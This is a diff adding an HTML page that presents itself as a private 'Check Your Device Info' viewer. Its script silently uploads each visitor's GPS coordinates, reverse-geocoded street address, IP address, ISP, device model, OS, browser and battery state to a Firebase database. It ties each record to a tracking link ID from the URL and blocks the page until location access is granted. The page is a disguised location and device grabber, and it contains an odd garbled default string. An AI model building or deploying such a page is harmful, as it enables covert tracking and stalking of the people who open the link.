@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title id="pageTitle">Check Your Device Info</title>
+  <!-- Favicon for browser tabs and link previews -->
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <!-- Apple Touch Icon for iOS and modern browsers -->
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  <!-- Meta tags for link previews -->
+  <meta property="og:title" content="Check Your Device Info" />
+  <meta name="twitter:title" content="Check Your Device Info" />
+  <meta name="description" content="View your mobile device, network, and location details privately." />
+  <meta property="og:description" content="View your mobile device, network, and location details privately." />
+  <meta name="twitter:card" content="summary" />
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.37/ua-parser.min.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html, body {
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      overflow-x: hidden;
+      touch-action: pan-y;
+    }
+
+    .container {
+      max-width: 900px;
+      width: 100%;
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(15px);
+      border-radius: 20px;
+      padding: 40px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      animation: fadeIn 1s ease-in-out;
+      overflow-x: hidden;
+      display: none;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    h1 {
+      text-align: center;
+      color: #ffffff;
+      font-size: 2.5rem;
+      margin-bottom: 30px;
+      text-transform: uppercase;
+      letter-spacing: 2px;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+    }
+
+    .info {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      padding: 15px;
+      margin: 10px 0;
+      background: rgba(255, 255, 255, 0.15);
+      border-radius: 12px;
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      transition: all 0.3s ease;
+      cursor: pointer;
+      width: 100%;
+      overflow: hidden;
+    }
+
+    .info:hover {
+      background: rgba(255, 255, 255, 0.25);
+      transform: translateX(10px);
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    .icon {
+      font-size: 1.5rem;
+      color: #00d4ff;
+      filter: drop-shadow(0 0 5px #00d4ff);
+    }
+
+    .info span {
+      color: #ffffff;
+      font-size: 1.1rem;
+      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+      word-break: break-word;
+    }
+
+    .loader {
+      border: 4px solid rgba(255, 255, 255, 0.2);
+      border-top: 4px solid #00d4ff;
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      animation: spin 1s linear infinite;
+      display: inline-block;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .consent-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(5px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      animation: modalFadeIn 0.5s ease-in-out;
+    }
+
+    .consent-box {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(15px);
+      border-radius: 20px;
+      padding: 30px;
+      max-width: 500px;
+      width: 90%;
+      text-align: center;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      transform: scale(0.8);
+      animation: scaleUp 0.4s ease-in-out forwards;
+    }
+
+    @keyframes modalFadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes scaleUp {
+      to { transform: scale(1); }
+    }
+
+    .consent-box h2 {
+      color: #ffffff;
+      font-size: 1.8rem;
+      margin-bottom: 20px;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+    }
+
+    .consent-box p {
+      color: #e0e0e0;
+      font-size: 1.1rem;
+      margin-bottom: 30px;
+      line-height: 1.5;
+    }
+
+    .consent-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+    }
+
+    .consent-button {
+      padding: 12px 30px;
+      border: none;
+      border-radius: 25px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-transform: uppercase;
+    }
+
+    .allow-button {
+      background: #00d4ff;
+      color: #ffffff;
+      box-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
+    }
+
+    .allow-button:hover {
+      background: #00b8d4;
+      transform: translateY(-2px);
+    }
+
+    .deny-button {
+      background: #ff4d4d;
+      color: #ffffff;
+      box-shadow: 0 0 10px rgba(255, 77, 77, 0.5);
+    }
+
+    .deny-button:hover {
+      background: #e63939;
+      transform: translateY(-2px);
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        padding: 20px;
+      }
+      h1 {
+        font-size: 1.8rem;
+      }
+      .info span {
+        font-size: 0.95rem;
+      }
+      .icon {
+        font-size: 1.2rem;
+      }
+      .consent-box h2 {
+        font-size: 1.5rem;
+      }
+      .consent-box p {
+        font-size: 0.95rem;
+      }
+      .consent-button {
+        padding: 10px 25px;
+        font-size: 0.9rem;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 15px;
+      }
+      h1 {
+        font-size: 1.5rem;
+      }
+      .info {
+        padding: 12px;
+        gap: 10px;
+      }
+      .info span {
+        font-size: 0.85rem;
+      }
+      .consent-box {
+        padding: 20px;
+      }
+      .consent-box h2 {
+        font-size: 1.3rem;
+      }
+      .consent-box p {
+        font-size: 0.85rem;
+      }
+      .consent-buttons {
+        flex-direction: column;
+        gap: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="consent-modal" id="consentModal">
+    <div class="consent-box" id="consentBox">
+      <h2>Allow Location Access</h2>
+      <p>We need your location to display accurate device and location details. Without permission, some information won't be available.</p>
+      <div class="consent-buttons">
+        <button class="consent-button allow-button" id="allowLocation">Allow Location</button>
+        <button class="consent-button deny-button" id="denyLocation">Deny</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="container" id="mainContent">
+    <h1 id="mainHeading"></h1>
+    <div class="info"><span class="icon">📱</span><span id="device">Device: Loading...</span></div>
+    <div class="info"><span class="icon">💻</span><span id="os">Operating System: Loading...</span></div>
+    <div class="info"><span class="icon">🌐</span><span id="browser">Browser: Loading...</span></div>
+    <div class="info"><span class="icon">🖥️</span><span id="screen">Screen Resolution: Loading...</span></div>
+    <div class="info"><span class="icon">📡</span><span id="network">Network Type: Loading...</span></div>
+    <div class="info"><span class="icon">🌍</span><span id="ip">IP Address: Loading...</span></div>
+    <div class="info"><span class="icon">📍</span><span id="location">Location: Loading...</span></div>
+    <div class="info"><span class="icon">🏢</span><span id="isp">Network Provider: Loading...</span></div>
+    <div class="info"><span class="icon">🕒</span><span id="timezone">Timezone: Loading...</span></div>
+    <div class="info"><span class="icon">🗣️</span><span id="language">Language: Loading...</span></div>
+    <div class="info"><span class="icon">🔋</span><span id="battery">Battery Status: Loading...</span></div>
+    <div class="info"><span class="icon">🗺️</span><span id="gps">Current GPS Location: Loading...</span></div>
+    <div class="info"><span class="icon">🏛️</span><span id="landmark">Landmark: Loading...</span></div>
+  </div>
+
+  <script>
+    // Dynamic title generation
+    function generateDynamicTitle() {
+      const titleTemplates = [
+        "Check Your Device Info",
+        "View My Mobile Details",
+        "Explore Your Network Info",
+        "See My Device Specs",
+        "Verify Your Location",
+        "Access My IP Details",
+        "Check My Battery Status",
+        "View Your GPS Location",
+        "Confirm My Network Provider",
+        "Discover Your Browser Info",
+        "Check Your Screen Resolution",
+        "See My Operating System",
+        "Explore Your Timezone",
+        "View My Language Settings",
+        "Verify Your Landmark",
+        "Access Your Device Stats",
+        "Check My Network Type",
+        "See Your IP Address",
+        "Confirm My Location Details",
+        "Discover Your Mobile Info"
+      ];
+      const index = Math.floor(Date.now() / 1000) % titleTemplates.length;
+      return titleTemplates[index];
+    }
+
+    const dynamicTitle = generateDynamicTitle();
+    document.getElementById('pageTitle').textContent = dynamicTitle;
+    document.getElementById('mainHeading').textContent = dynamicTitle;
+    document.querySelector('meta[property="og:title"]').setAttribute('content', dynamicTitle);
+    document.querySelector('meta[name="twitter:title"]').setAttribute('content', dynamicTitle);
+
+    // Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyBWwcHZKNvq9qCq0YOR2NIwCqmo85qEHHg",
+      authDomain: "armemg-8d7f0.firebaseapp.com",
+      databaseURL: "https://armemg-8d7f0-default-rtdb.firebaseio.com",
+      projectId: "armemg-8d7f0",
+      storageBucket: "armemg-8d7f0.appspot.com",
+      messagingSenderId: "897395291114",
+      appId: "1:897395291114:web:fccd2eb9bfa749f9e43893"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Generate unique device ID
+    function generateUniqueId() {
+      return 'device_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+    }
+
+    // Store deviceId in localStorage for consistency
+    let deviceId = localStorage.getItem('deviceId');
+    if (!deviceId) {
+      deviceId = generateUniqueId();
+      localStorage.setItem('deviceId', deviceId);
+    }
+
+    // Device data object
+    const deviceData = {
+      deviceId: deviceId,
+      timestamp: new Date().toISOString(),
+      linkId: new URLSearchParams(window.location.search).get('id') || 'anonymous'
+    };
+
+    // Consent modal elements
+    const consentModal = document.getElementById('consentModal');
+    const mainContent = document.getElementById('mainContent');
+    const consentBox = document.getElementById('consentBox');
+    const allowButton = document.getElementById('allowLocation');
+    const denyButton = document.getElementById('denyLocation');
+
+    // Initialize UAParser
+    const parser = new UAParser();
+    const result = parser.getResult();
+
+    // Function to get device and OS
+    async function getDeviceAndOS() {
+      let deviceModel = "Unknown";
+      let deviceType = "Desktop Växjö";
+      let osName = "Unknown";
+      let osVersion = "";
+
+      if (navigator.userAgentData) {
+        try {
+          const uaData = await navigator.userAgentData.getHighEntropyValues([
+            "model",
+            "platform",
+            "platformVersion",
+            "mobile"
+          ]);
+          deviceModel = uaData.model || "Unknown";
+          deviceType = uaData.mobile ? "Mobile" : "Desktop";
+          osName = uaData.platform || "Unknown";
+          osVersion = uaData.platformVersion || "";
+        } catch (error) {
+          console.error("Error fetching User-Agent Client Hints:", error);
+        }
+      }
+
+      if (deviceModel === "Unknown" || osName === "Unknown") {
+        const regexMatch = navigator.userAgent.match(
+          /(SM-\w+|Redmi\s\w+|Infinix\s\w+|TECNO\s\w+|Pixel\s\d+|iPhone\s?\w*|Poco\s\w+|OnePlus\s\w+|Nokia\s\w+|Vivo\s\w+|Oppo\s\w+)/i
+        );
+        deviceModel = regexMatch ? regexMatch[0] : (result.device.model || result.device.vendor || "Unknown");
+        deviceType = result.device.type || (navigator.userAgent.includes("Mobile") ? "Mobile" : "Desktop");
+        osName = result.os.name || "Unknown";
+        osVersion = result.os.version || "";
+      }
+
+      return {
+        deviceName: `${deviceModel} (${deviceType})`,
+        os: `${osName} ${osVersion}`.trim()
+      };
+    }
+
+    // Load non-location data
+    function loadNonLocationData() {
+      getDeviceAndOS().then(({ deviceName, os }) => {
+        deviceData.deviceName = deviceName;
+        deviceData.os = os;
+        document.getElementById('device').textContent = `Device: ${deviceData.deviceName}`;
+        document.getElementById('os').textContent = `Operating System: ${deviceData.os}`;
+      }).catch(error => {
+        console.error("Error getting device/OS info:", error);
+        deviceData.deviceName = "Unknown";
+        deviceData.os = "Unknown";
+        document.getElementById('device').textContent = "Device: Unknown";
+        document.getElementById('os').textContent = "Operating System: Unknown";
+      });
+
+      deviceData.browser = `${result.browser.name || "Unknown"} ${result.browser.version || ""}`;
+      deviceData.screen = `${window.screen.width} x ${window.screen.height}`;
+      deviceData.network = navigator.connection
+        ? (navigator.connection.type === 'wifi'
+          ? 'WiFi'
+          : navigator.connection.effectiveType
+            ? navigator.connection.effectiveType.toUpperCase()
+            : 'Unknown')
+        : 'Unknown';
+      deviceData.language = navigator.language || "Unknown";
+      deviceData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+
+      document.getElementById('browser').textContent = `Browser: ${deviceData.browser}`;
+      document.getElementById('screen').textContent = `Screen Resolution: ${deviceData.screen}`;
+      document.getElementById('network').textContent = `Network Type: ${deviceData.network}`;
+      document.getElementById('language').textContent = `Language: ${deviceData.language}`;
+      document.getElementById('timezone').textContent = `Timezone: ${deviceData.timezone}`;
+
+      if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+          const level = Math.round(battery.level * 100);
+          deviceData.battery = `${level}% ${battery.charging ? '(Charging)' : ''}`;
+          document.getElementById('battery').textContent = `Battery Status: ${deviceData.battery}`;
+        }).catch(() => {
+          document.getElementById('battery').textContent = "Battery Status: Not supported";
+        });
+      } else {
+        document.getElementById('battery').textContent = "Battery Status: Not supported";
+      }
+
+      fetch("https://ipapi.co/json/")
+        .then(res => {
+          if (!res.ok) throw new Error('Network response was not ok');
+          return res.json();
+        })
+        .then(data => {
+          deviceData.ip = data.ip || "Unknown";
+          deviceData.location = `${data.city || "Unknown"}, ${data.region || "Unknown"}, ${data.country_name || "Unknown"}`;
+          deviceData.isp = data.org || "Unknown";
+          document.getElementById('ip').textContent = `IP Address: ${deviceData.ip}`;
+          document.getElementById('location').textContent = `Location: ${deviceData.location}`;
+          document.getElementById('isp').textContent = `Network Provider: ${deviceData.isp}`;
+          if (deviceData.network === 'WiFi') {
+            deviceData.network = `WiFi (${deviceData.isp})`;
+            document.getElementById('network').textContent = `Network Type: ${deviceData.network}`;
+          }
+          checkAndSave();
+        })
+        .catch(error => {
+          console.error('Error fetching IP data:', error);
+          document.getElementById('ip').textContent = "IP Address: Failed to load";
+          document.getElementById('location').textContent = "Location: Failed to load";
+          document.getElementById('isp').textContent = "Network Provider: Failed to load";
+          checkAndSave();
+        });
+    }
+
+    // Counter for async API calls
+    let apiCallsCompleted = 0;
+    const totalApiCalls = 2;
+
+    // Save to Firebase
+    function saveToFirebase() {
+      // Check if device already exists
+      db.ref(`devices/${deviceData.deviceId}`).once('value').then(snapshot => {
+        if (snapshot.exists()) {
+          // Device exists, update only specific fields
+          db.ref(`devices/${deviceData.deviceId}`).update({
+            timestamp: new Date().toISOString(),
+            gps: deviceData.gps || null,
+            gpsLocation: deviceData.gpsLocation || 'Unknown',
+            landmark: deviceData.landmark || 'Unknown'
+          });
+        } else {
+          // New device, save and increment deviceCount in links
+          db.ref(`devices/${deviceData.deviceId}`).set(deviceData).then(() => {
+            if (deviceData.linkId !== 'anonymous') {
+              db.ref(`links/${deviceData.linkId}`).transaction(link => {
+                if (link) {
+                  link.deviceCount = (link.deviceCount || 0) + 1;
+                } else {
+                  link = { deviceCount: 1, used: true, createdAt: new Date().toISOString() };
+                }
+                return link;
+              });
+            }
+          });
+        }
+      }).catch(error => {
+        console.error('Error saving to Firebase:', error);
+      });
+    }
+
+    // Check if all API calls are complete
+    function checkAndSave() {
+      apiCallsCompleted++;
+      if (apiCallsCompleted === totalApiCalls) {
+        saveToFirebase();
+      }
+    }
+
+    // Handle location data
+    function loadLocationData() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            localStorage.setItem('locationConsentGiven', 'true');
+            consentModal.style.display = 'none';
+            mainContent.style.display = 'block';
+            loadNonLocationData();
+
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            deviceData.gps = { latitude: lat, longitude: lon };
+
+            fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
+              .then(res => {
+                if (!res.ok) throw new Error('Network response was not ok');
+                return res.json();
+              })
+              .then(data => {
+                const city = data.city || data.locality || data.principalSubdivision || "Unknown Area";
+                const country = data.countryName || "Unknown Country";
+                deviceData.gpsLocation = `${city}, ${country}`;
+                document.getElementById('gps').textContent = `Current GPS Location: ${deviceData.gpsLocation}`;
+              })
+              .catch(error => {
+                console.error('Error fetching GPS location:', error);
+                document.getElementById('gps').textContent = "Current GPS Location: Failed to load";
+              });
+
+            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=en`)
+              .then(res => {
+                if (!res.ok) throw new Error('Network response was not ok');
+                return res.json();
+              })
+              .then(data => {
+                deviceData.landmark = data.display_name || "Landmark not found";
+                document.getElementById('landmark').textContent = `Landmark: ${deviceData.landmark}`;
+                checkAndSave();
+              })
+              .catch(error => {
+                console.error('Error fetching landmark:', error);
+                document.getElementById('landmark').textContent = "Landmark: Not found";
+                checkAndSave();
+              });
+          },
+          error => {
+            consentModal.style.display = 'flex';
+            mainContent.style.display = 'none';
+            document.getElementById('gps').textContent = "Current GPS Location: Permission required";
+            document.getElementById('landmark').textContent = "Landmark: Permission required";
+            checkAndSave();
+          }
+        );
+      } else {
+        consentModal.style.display = 'flex';
+        mainContent.style.display = 'none';
+        document.getElementById('gps').textContent = "Current GPS Location: Geolocation not supported";
+        document.getElementById('landmark').textContent = "Landmark: Geolocation not supported";
+        checkAndSave();
+      }
+    }
+
+    // Consent modal logic
+    if (localStorage.getItem('locationConsentGiven') === 'true') {
+      consentModal.style.display = 'none';
+      mainContent.style.display = 'block';
+      loadNonLocationData();
+      loadLocationData();
+    } else {
+      consentModal.style.display = 'flex';
+      mainContent.style.display = 'none';
+    }
+
+    allowButton.addEventListener('click', () => {
+      loadLocationData();
+    });
+
+    denyButton.addEventListener('click', () => {
+      consentBox.innerHTML = `
+        <h2>Location Access Required</h2>
+        <p>You must allow location access to view this site. Please reload and select 'Allow Location' to continue.</p>
+        <div class="consent-buttons">
+          <button class="consent-button allow-button" onclick="location.reload()">Try Again</button>
+        </div>
+      `;
+      consentModal.style.display = 'flex';
+      mainContent.style.display = 'none';
+    });
+  </script>
+</body>
+</html>
